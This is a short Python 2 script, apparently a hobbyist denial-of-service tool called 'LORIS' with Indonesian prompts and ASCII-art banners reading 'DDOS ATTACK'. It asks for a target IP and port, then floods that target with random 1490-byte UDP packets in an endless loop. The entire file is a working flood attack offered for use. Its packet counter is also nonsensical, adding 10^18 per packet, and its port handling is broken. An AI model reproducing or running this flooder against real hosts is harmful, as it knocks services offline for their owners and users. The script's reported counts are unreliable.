




import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet LORIS")
print """\033[32;1m                  . .IIIII             .II
          IIIIIIIIII. I  II  .    II..IIII-V.1.5-IIIIIIIII
      .  .IIIIII  II             IIIIIIIIIIIIIIIIIIIII  I.
        .IIIII.III I        IIIByIII-II+MR.SPOON+III"
          .IIIIIIII           II  .IIIII IIIIIIIIIIII. I
            IIIIII             IIII I  III+DDOS+IIII I
           .II               IIIIIIIIIIIII  IIIIIIIII
              I.           .II+ATTACK+II    I   II  I
                .IIII        IIIIIIIIIIII     .       I
                  IIIII.          IIIIII           . I.
                 +HACKING+         IIIII             ..I  II .
                  IIIIIII          IIII...             IIII
                    IIII           III. I            IIBPCII
                    III             I                I  III
                    II                                   I   .
                     I     LORIS               
"""
        
  
print "\033[32;1m<=======================================>"         
print "\033[34;1m||========>LORIS<=========||"
print "\033[32;1m<=======================================>"
print "CREATED=MR.SPOON"
print "thanks to=PUTRA-KING-SAHRUL-HIDDEN-MR.GENDER-FIREWOFL-LIONCYBER-ALL MEMBER BPC"
print
ip = raw_input("MASUKAN IP TAGET ===> ")
port = input("Port       ===> ")

os.system("clear")
os.system("figlet Loading..")
print "membutuhkan waktu 10 detik"
time.sleep(10)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1000000000000000000
     port = port + 0
     print "\033[32;1mMengirim %s packet ke %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 0
